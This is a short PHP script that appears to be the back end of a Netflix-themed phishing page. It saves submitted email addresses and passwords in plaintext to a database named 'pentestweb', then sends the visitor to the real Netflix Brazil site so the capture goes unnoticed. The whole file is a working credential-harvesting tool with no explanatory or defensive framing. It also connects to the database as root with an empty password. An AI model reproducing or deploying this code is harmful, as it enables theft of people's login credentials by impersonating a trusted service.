<?php
//var_dump($_SERVER["REQUEST_METHOD"]);
//print_r($_POST);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if ($_POST["email"] != "" AND $_POST["pass"] != "") {


        $conn = new PDO("mysql:host=localhost;dbname=pentestweb", 'root', '');

        $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        echo "Connected successfully";
        $stmt =  $conn->prepare(' INSERT INTO tb_usuario(LOGIN_US,SENHA_US) VALUES(? , ?) ');
        $stmt->execute(array ( $_POST["email"], $_POST["pass"]));
        // echo "feito";	
        header("Location:https://www.netflix.com/br/");
    }else{
       header("Location:/");
    }
    
}else{
    die("");
}

?>